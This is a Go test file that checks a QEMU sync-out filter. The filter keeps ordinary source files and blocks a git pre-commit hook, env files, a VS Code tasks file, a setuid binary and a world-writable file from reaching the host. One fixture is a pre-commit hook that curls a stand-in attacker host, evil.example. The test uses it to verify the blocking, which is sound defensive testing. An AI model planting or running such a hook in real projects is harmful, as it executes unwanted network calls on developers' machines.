package qemu

import (
	"archive/tar"
	"bytes"
	"io"
	"slices"
	"strings"
	"testing"
)

type nopWriteCloser struct{ io.Writer }

func (nopWriteCloser) Close() error { return nil }

func TestPumpSyncOutFilter(t *testing.T) {
	var out, warn bytes.Buffer
	if err := filterSyncOut(nopWriteCloser{&out}, buildSyncOutSource(t), &warn); err != nil {
		t.Fatalf("filterSyncOut: %v", err)
	}
	got, bodies := readSyncOutArchive(t, &out)
	want := []string{".git/", ".git/hooks/", "main.go", "src/", "src/util.go", "latest"}
	if !slices.Equal(got, want) {
		t.Errorf("kept entries = %v, want %v", got, want)
	}
	if bodies["main.go"] != "package main\n" {
		t.Errorf("main.go body = %q, want the original bytes", bodies["main.go"])
	}
	for _, name := range []string{".envrc", ".env.local", ".vscode/tasks.json", "tool", "note.txt", ".git/hooks/pre-commit"} {
		if _, ok := bodies[name]; ok {
			t.Errorf("denied entry %s reached the host tree", name)
		}
	}
	for _, name := range []string{".envrc", "tool", "note.txt"} {
		if !strings.Contains(warn.String(), "warning: sync-out skipped "+name) {
			t.Errorf("no warning line for %s in %q", name, warn.String())
		}
	}
}

func buildSyncOutSource(t *testing.T) *bytes.Buffer {
	t.Helper()
	var src bytes.Buffer
	tw := tar.NewWriter(&src)
	writeSyncOutDir(t, tw, ".git/")
	writeSyncOutDir(t, tw, ".git/hooks/")
	writeSyncOutReg(t, tw, ".git/hooks/pre-commit", 0o755, "#!/bin/sh\ncurl http://evil.example\n")
	writeSyncOutReg(t, tw, ".envrc", 0o644, "export SECRET=1\n")
	writeSyncOutReg(t, tw, ".env.local", 0o644, "DEBUG=1\n")
	writeSyncOutReg(t, tw, ".vscode/tasks.json", 0o644, "{}\n")
	writeSyncOutReg(t, tw, "tool", 0o4755, "ELF")
	writeSyncOutReg(t, tw, "note.txt", 0o666, "hello\n")
	writeSyncOutReg(t, tw, "main.go", 0o644, "package main\n")
	writeSyncOutDir(t, tw, "src/")
	writeSyncOutReg(t, tw, "src/util.go", 0o644, "package src\n")
	writeSyncOutLink(t, tw, "latest", "main.go")
	if err := tw.Close(); err != nil {
		t.Fatalf("close source tar: %v", err)
	}
	return &src
}

func readSyncOutArchive(t *testing.T, r io.Reader) ([]string, map[string]string) {
	t.Helper()
	tr := tar.NewReader(r)
	names := []string{}
	bodies := map[string]string{}
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			return names, bodies
		}
		if err != nil {
			t.Fatalf("read filtered tar: %v", err)
		}
		names = append(names, hdr.Name)
		if hdr.Typeflag == tar.TypeReg {
			body, err := io.ReadAll(tr)
			if err != nil {
				t.Fatalf("read %s body: %v", hdr.Name, err)
			}
			bodies[hdr.Name] = string(body)
		}
	}
}

func writeSyncOutReg(t *testing.T, tw *tar.Writer, name string, mode int64, body string) {
	t.Helper()
	hdr := &tar.Header{Name: name, Mode: mode, Size: int64(len(body)), Typeflag: tar.TypeReg}
	if err := tw.WriteHeader(hdr); err != nil {
		t.Fatalf("write %s header: %v", name, err)
	}
	if _, err := tw.Write([]byte(body)); err != nil {
		t.Fatalf("write %s body: %v", name, err)
	}
}

func writeSyncOutDir(t *testing.T, tw *tar.Writer, name string) {
	t.Helper()
	hdr := &tar.Header{Name: name, Mode: 0o755, Typeflag: tar.TypeDir}
	if err := tw.WriteHeader(hdr); err != nil {
		t.Fatalf("write %s header: %v", name, err)
	}
}

func writeSyncOutLink(t *testing.T, tw *tar.Writer, name, target string) {
	t.Helper()
	hdr := &tar.Header{Name: name, Mode: 0o777, Typeflag: tar.TypeSymlink, Linkname: target}
	if err := tw.WriteHeader(hdr); err != nil {
		t.Fatalf("write %s header: %v", name, err)
	}
}
